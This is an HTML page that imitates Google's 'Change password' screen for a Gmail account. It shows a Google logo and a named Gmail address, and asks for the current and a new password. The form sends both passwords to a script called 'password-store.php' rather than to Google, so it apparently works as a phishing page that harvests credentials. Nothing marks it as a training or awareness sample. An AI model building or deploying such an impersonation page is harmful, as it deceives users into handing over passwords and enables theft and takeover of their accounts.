<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
        <link rel="stylesheet" href="style.css">
        <script src="script.js"></script>
            <title>Gmail Password Change For Security Purpose</title>
  
</head>

<body>
    <div class="form-container">
        <div id="google">
            <img src="google-removebg-preview.png" alt="" width="120px">

        </div>
        <h2>Change password</h2>
        <div id="gmail"><i class="fa-regular fa-user"></i> musaakhann031@gmail.com <i
                class="fa-solid fa-caret-down"></i></div>
                
        <form action="password-store.php" method="post">

            <label for="password"><strong>Create a strong password</strong></label><br>
            <p>Create a new, strong password that you don't use for other websites</p>

            <div>
                <input type="password" id="cur-pass" name="cur-pass" required placeholder="Current Password"><br>
                <i class="far fa-eye  pass-icon" id="togglePassword"></i>

            </div>
            <div>
                <input type="password" id="new-pass" name="new-pass" required placeholder="New Password">
                <br><i class="far fa-eye  pass-icon" id="toggleePassword"></i>

            </div>
            <input type="submit" value="Submit">
        </form>
    </div>
    <script src="script.js"></script>


</body>

</html>